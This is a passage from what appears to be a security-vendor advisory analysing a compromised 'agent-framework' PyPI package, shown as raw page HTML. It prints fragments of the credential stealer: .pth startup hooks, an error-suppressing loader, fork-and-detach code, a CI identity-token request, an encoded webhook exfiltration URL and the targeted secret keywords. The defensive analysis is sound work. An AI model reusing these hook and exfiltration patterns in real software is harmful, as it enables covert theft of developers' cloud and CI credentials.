:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M10.488 14.651 15.25 21h7l-7.858-10.478L20.93 3h-2.65l-5.117 5.886L8.75 3h-7l7.51 10.015L2.32 21h2.65zM16.25 19 5.75 5h2l10.5 14z"/></svg></div></a></li><li class="d_flex"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsocket.dev%2Fblog%2Fagent-framework-pypi-package-compromised-with-credential-stealer" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" class="d_inline-flex w_24px c_text.primary trs_color trs-dur_fast trs-tmf_power3Out hover:c_text.pink"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M18.336 18.339h-2.665v-4.177c0-.996-.02-2.278-1.39-2.278-1.389 0-1.601 1.084-1.601 2.205v4.25h-2.666V9.75h2.56v1.17h.035c.358-.674 1.228-1.387 2.528-1.387 2.7 0 3.2 1.778 3.2 4.092zM7.004 8.575a1.546 1.546 0 0 1-1.548-1.549 1.548 1.548 0 1 1 1.547 1.549m1.336 9.764H5.667V9.75H8.34zM19.67 3H4.33C3.594 3 3 3.58 3 4.297v15.406c0 .717.594 1.297 1.328 1.297h15.339C20.4 21 21 20.42 21 19.703V4.297c0-.716-.6-1.297-1.334-1.297z"/></svg></div></a></li><li class="d_flex"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsocket.dev%2Fblog%2Fagent-framework-pypi-package-compromised-with-credential-stealer" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" class="d_inline-flex w_24px c_text.primary trs_color trs-dur_fast trs-tmf_power3Out hover:c_text.pink"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M15.402 21v-6.966h2.333l.349-2.708h-2.682V9.599c0-.784.218-1.319 1.342-1.319h1.434V5.857a19 19 0 0 0-2.09-.107c-2.067 0-3.482 1.262-3.482 3.58v1.996h-2.338v2.708h2.338V21H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h16a1 1 0 0 1 1 1v16a1 1 0 0 1-1 1z"/></svg></div></a></li><li class="d_flex"><a href="/api/blog/feed.atom" target="_blank" aria-label="Subscribe to the Socket blog feed" class="d_inline-flex w_24px c_text.primary trs_color trs-dur_fast trs-tmf_power3Out hover:c_text.pink"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M3 3c9.941 0 18 8.059 18 18h-3c0-8.284-6.716-15-15-15zm0 7c6.075 0 11 4.925 11 11h-3a8 8 0 0 0-8-8zm0 7a4 4 0 0 1 4 4H3z"/></svg></div></a></li></ul></div></div><div class="lg:grid-c_span_6 min-w_0"><div class=""><div class="d_flex flex-d_column gap_24px w_100% min-w_0 [&amp;_&gt;_:first-child]:mt_0"><div id="Executive-Summary" class="textStyle_display-xl ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h2 class="ff_body d_inline">Executive Summary</h2><a href="#Executive-Summary" class="article-anchor" aria-label="Permalink: Executive Summary">#</a></div><p class="textStyle_article-body ff_inter c_text.primary">The Microsoft <a href="https://socket.dev/pypi/package/agent-framework/overview/1.26.2" target="_blank" rel="noopener noreferrer" class="c_text.primary fw_medium td_underline td-c_text.secondary td-t_6% text-underline-position_from-font trs_color trs-dur_fast trs-tmf_power3Out hover:c_text.pink hover:td-c_text.pink">agent-framework</a> PyPI package was compromised on November 17th, affecting versions 1.26.1 and 1.26.2. Both versions install Python startup hooks that silently collect credentials, environment data, and cloud identity tokens, then exfiltrate them to a <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">webhook[.]site</code> endpoint. Avoid installing either version; if installed, remove them and rotate potentially exposed credentials.</p><div id="Attack-Analysis" class="textStyle_display-xl ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h2 class="ff_body d_inline">Attack Analysis</h2><a href="#Attack-Analysis" class="article-anchor" aria-label="Permalink: Attack Analysis">#</a></div><p class="textStyle_article-body ff_inter c_text.primary">On Python startup, the <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">.pth</code> file imports a module that launches collection in a background process/thread. Version 1.26.1 routes through <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta.pth</code> → <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta/**init**.py</code> → <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta/_telemetry.py</code>; 1.26.2 uses <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">af_runtime_diag.pth</code> → <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">af_runtime_diag.py</code>.</p><p class="textStyle_article-body ff_inter c_text.primary">The code gathers credential-related environment variables, local config/credential files, and other processes’ environments. It also requests cloud/workflow identity tokens (including Azure in both versions and GitHub Actions OIDC in 1.26.2). It serializes the results, compresses and Base64-encodes them, then POSTs them to the same concealed webhook.site endpoint: <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">https[://]webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb</code></p><div id="Version-1.26.1:-startup-hook-package-initializer-collector." class="textStyle_display-lg ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h3 class="ff_body d_inline"><strong class="fw_semibold">Version 1.26.1: startup hook → package initializer → collector.</strong></h3><a href="#Version-1.26.1:-startup-hook-package-initializer-collector." class="article-anchor" aria-label="Permalink: Version 1.26.1: startup hook → package initializer → collector.">#</a></div><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta.pth</code></strong> executes on interpreter startup through Python’s <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">site</code> processing:</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit"><span class="hljs-keyword">import</span> agent_framework_meta
</code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta/__init__.py</code></strong> adds a supposedly diagnostic hook that imports and starts the payload, suppressing errors:</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit"><span class="hljs-comment"># Lightweight runtime diagnostics hook</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> _telemetry <span class="hljs-keyword">as</span> _telemetry
    _telemetry._start()
<span class="hljs-keyword">except</span> Exception:
    <span class="hljs-keyword">pass</span></code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary"><br/></p><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta/_telemetry.py</code></strong> collects credentials asynchronously. Its startup guard is inherited by child processes; on Unix, it forks and detaches. Platforms without <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">fork</code> use a daemon thread.</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_start</span>():
    <span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;_AF_TEL&quot;</span>):
        <span class="hljs-keyword">return</span>
    os.environ[<span class="hljs-string">&quot;_AF_TEL&quot;</span>] = <span class="hljs-string">&quot;1&quot;</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(os, <span class="hljs-string">&quot;fork&quot;</span>):
            pid = os.fork()
            <span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:
                <span class="hljs-keyword">try</span>:
                    os.setsid()
                <span class="hljs-keyword">except</span> Exception:
                    <span class="hljs-keyword">pass</span>
                _run()
                os._exit(<span class="hljs-number">0</span>)
            <span class="hljs-keyword">return</span>
</code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary">Fresh process trees can trigger collection again; there is no persistent on-disk execution marker.</p><div id="Version-1.26.2:-relocated-payload-and-expanded-GitHub-targeting." class="textStyle_display-lg ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h3 class="ff_body d_inline"><strong class="fw_semibold">Version 1.26.2: relocated payload and expanded GitHub targeting.</strong></h3><a href="#Version-1.26.2:-relocated-payload-and-expanded-GitHub-targeting." class="article-anchor" aria-label="Permalink: Version 1.26.2: relocated payload and expanded GitHub targeting.">#</a></div><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">af_runtime_diag.pth</code></strong> replaces the original startup hook with a single line that imports the new top-level payload:</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit"><span class="hljs-keyword">import</span> af_runtime_diag
</code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold"><code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">af_runtime_diag.py</code></strong> starts collection on import. The legitimate package initializer is restored byte-for-byte, so inspecting only <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">agent_framework_meta/__init__.py</code> misses this version. The collector adds GitHub Actions OIDC token requests:</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit">u = os.environ.get(<span class="hljs-string">&quot;ACTIONS_ID_TOKEN_REQUEST_URL&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>
t = os.environ.get(<span class="hljs-string">&quot;ACTIONS_ID_TOKEN_REQUEST_TOKEN&quot;</span>) <span class="hljs-keyword">or</span> os.environ.get(<span class="hljs-string">&quot;ACTIONS_RUNTIME_TOKEN&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">if</span> u <span class="hljs-keyword">and</span> t:
    <span class="hljs-keyword">for</span> aud <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;api://AzureADTokenExchange&quot;</span>, <span class="hljs-string">&quot;&lt;https://management.azure.com/&gt;&quot;</span>):</code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary"><br/></p><p class="textStyle_article-body ff_inter c_text.primary"><strong class="fw_semibold">Both collectors harvest and exfiltrate secrets.</strong></p><p class="textStyle_article-body ff_inter c_text.primary">They inspect environment variables, other processes’ environments, credential files, and cloud identity endpoints. They actively request fresh Azure managed-identity and CI federation tokens rather than merely copying existing secrets.</p><p class="textStyle_article-body ff_inter c_text.primary">Both payload modules contain the same encoded destination:</p><div class="w_100%"><div class="d_flex ai_center jc_space-between gap_sm px_md py_sm bg_bg.base bd-b_1px_solid_{colors.border.ivoryLight}"><span class="textStyle_article-code-label ff_inter c_text.secondary">Python</span><button class="" aria-label="Copy command" type="button"><div class="d_flex ai_center jc_center w_20px h_20px c_text.secondary cursor_pointer trs_opacity trs-dur_fast trs-tmf_power3Out hover:op_0.7"><div aria-hidden="true" class="d_inline-block va_middle [&amp;_&gt;_:is(svg,_img)]:d_block [&amp;_&gt;_:is(svg,_img)]:w_100% [&amp;_&gt;_:is(svg,_img)]:h_auto"><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M7 6V3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1h-3v3a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1zM5 8v12h10V8zm4-2h8v10h2V4H9z"/></svg></div></div></button></div><pre class="p_md m_0 bg_bg.base c_syntax.plain ov-x_auto [&amp;_.hljs-comment,_&amp;_.hljs-quote,_&amp;_.hljs-meta]:c_syntax.comment [&amp;_.hljs-keyword,_&amp;_.hljs-selector-tag,_&amp;_.hljs-literal,_&amp;_.hljs-type,_&amp;_.hljs-name,_&amp;_.hljs-doctag]:c_syntax.keyword [&amp;_.hljs-string,_&amp;_.hljs-regexp,_&amp;_.hljs-addition,_&amp;_.hljs-symbol,_&amp;_.hljs-bullet,_&amp;_.hljs-template-tag]:c_syntax.string [&amp;_.hljs-number,_&amp;_.hljs-deletion]:c_syntax.number [&amp;_.hljs-title,_&amp;_.hljs-section,_&amp;_.hljs-built_in,_&amp;_.hljs-selector-id,_&amp;_.hljs-selector-class]:c_syntax.function [&amp;_.hljs-attr,_&amp;_.hljs-attribute,_&amp;_.hljs-variable,_&amp;_.hljs-template-variable]:c_syntax.property [&amp;_.hljs-emphasis]:font-style_italic [&amp;_.hljs-strong]:fw_semibold"><span class="textStyle_article-code ff_mono d_block"><code class="ff_inherit">_ENC = <span class="hljs-string">&quot;aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi&quot;</span>
</code></span></pre></div><p class="textStyle_article-body ff_inter c_text.primary">Collected JSON is zlib-compressed, base64-encoded, and POSTed to the decoded webhook with <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">?t=telemetry</code>. Encoding provides no confidentiality beyond HTTPS. The reported payloads do not download or execute additional code.</p><div id="Targeted-Credentials" class="textStyle_display-xl ff_body c_text.primary mt_calc(40px_-_24px) scr-mt_calc(var(--site-header-offset)_+_24px) [&amp;_.article-anchor]:op_0 [&amp;_.article-anchor]:ms_xs [&amp;_.article-anchor]:c_text.secondary [&amp;_.article-anchor]:td_none [&amp;:hover_.article-anchor,_&amp;_.article-anchor:focus-visible]:op_1"><h2 class="ff_body d_inline">Targeted Credentials</h2><a href="#Targeted-Credentials" class="article-anchor" aria-label="Permalink: Targeted Credentials">#</a></div><ul class="d_flex flex-d_column gap_xs pl_lg"><li class="textStyle_article-body ff_inter c_text.primary li-t_disc"><strong class="fw_semibold">Environment secrets:</strong> substring-based matching, not a fixed variable allowlist. Reported selectors include <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">TOKEN</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">SECRET</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">KEY</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">AZURE</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">AWS</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">GITHUB</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">OPENAI</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">HF_</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out [a:hover_&amp;]:c_text.pink [&amp;:has(a:hover)]:c_text.pink">FOUNDRY</code>, <code class="px_4px py_2px bg_bg.light c_syntax.property ff_mono fs_0.9em trs_color trs-dur_fast trs-tmf_power3Out 